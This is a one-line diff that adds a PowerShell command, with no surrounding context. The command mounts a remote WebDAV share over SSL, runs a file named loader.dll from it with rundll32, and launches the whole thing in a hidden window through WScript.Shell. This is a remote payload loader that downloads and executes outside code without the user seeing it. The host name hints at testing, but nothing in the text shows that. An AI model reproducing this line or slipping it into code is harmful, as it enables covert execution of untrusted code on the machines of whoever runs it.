@@ -1,0 +1,1 @@
+$g='cmd /c pushd \\berserk-test.mom@SSL\2e8bace5-6217-48d5-9ef0-ea7d09513d32 & rundll32 loader.dll,#1';$w=New-Object -ComObject WScript.Shell;$w.Run($g,0,$false)
